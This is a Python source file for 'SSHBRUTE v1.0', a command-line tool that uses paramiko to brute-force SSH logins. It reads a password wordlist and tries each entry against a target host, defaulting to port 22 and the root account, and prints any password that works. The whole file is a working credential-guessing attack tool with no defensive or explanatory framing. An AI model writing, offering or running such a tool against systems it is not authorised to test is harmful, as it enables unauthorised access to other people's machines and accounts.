import argparse
import paramiko
import sys
import os

# Colors
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""
    {CYAN}{BOLD}
╭──────────────────────────────────────────╮
│              SSHBRUTE v1.0               │
╰──────────────────────────────────────────╯
    {RESET}""")

def sshbrute(host, port, username, wordlist):
    # Read the wordlist file
    try:
        with open(wordlist, "r") as file:
            passwords = [line.strip() for line in file if line.strip()]
    except Exception as reading_wordlist_error:
        print(f"{RED}[!] Failed to read the wordlist: {reading_wordlist_error}\n{RESET}")
        sys.exit(1)

    print(f"  Target    : {host}:{port}")
    print(f"  Username  : {username}")
    print(f"  Wordlist  : {wordlist}")
    print(f"  Entries   : {len(passwords)}")
    print()

    print(f"{CYAN}[•] Starting SSH password brute-forcing for a single username...{RESET}\n")

    # Create an SSH client instance
    client = paramiko.SSHClient()

    # Automatically add the server's host key (for first-time connections)
    # In a production environment, it's more secure to manage known_hosts explicitly.
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            # Attempting to connect to the remote SSH server
            client.connect(hostname=host, port=port, username=username, password=password, timeout=5, auth_timeout=5)
            print(f"[+] FOUND: {GREEN}{password}{RESET}")
            sys.exit(0) 
        except paramiko.AuthenticationException:
            print(f"{RED}[x] Authentication failed : {password}{RESET}")
            pass
        except paramiko.SSHException as error:
            print(f"{RED}[x] SSH connection error: {error}{RESET}")
            sys.exit(1)
        except Exception as error:
            print(f"{RED}[x] An error occurred: {error}{RESET}")
            sys.exit(1)
        finally:
            # Close the connection
            client.close()

# Check whether the wordlist file exists and is not empty
def wordlist_validation(wordlist):
    if not os.path.isfile(wordlist):
        print(f"{RED}[!] {wordlist}: No such a file\n{RESET}")
        sys.exit(1)

    if os.path.getsize(wordlist) == 0:
        print(f"{RED}[!] {wordlist} file doesn't contain any content!\n{RESET}")
        sys.exit(1)

def main():
    # Create an argument parser
    # ArgumentDefaultsHelpFormatter ensures default values are shown in the help text
    parser = argparse.ArgumentParser(description="Simple SSH password brute forcer", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    # Define the command-line arguments
    parser.add_argument("-t", "--target", metavar="", default="192.168.1.1", help="Target machine's ip address")
    parser.add_argument("-p", "--port", metavar="", type=int, default=22, help="Target machine's port address")
    parser.add_argument("-u", "--username", metavar="", default="root", help="SSH server username")
    parser.add_argument("-w", "--wordlist", metavar="", default="ssh_wordlist.txt", help="Path to password wordlist")

    # Parse and use the arguments
    args = parser.parse_args()

    # Show banner
    banner()

    # Validate the wordlist file
    wordlist_validation(args.wordlist)

    # SSH username bruteforce
    sshbrute(args.target, args.port, args.username, args.wordlist)

main()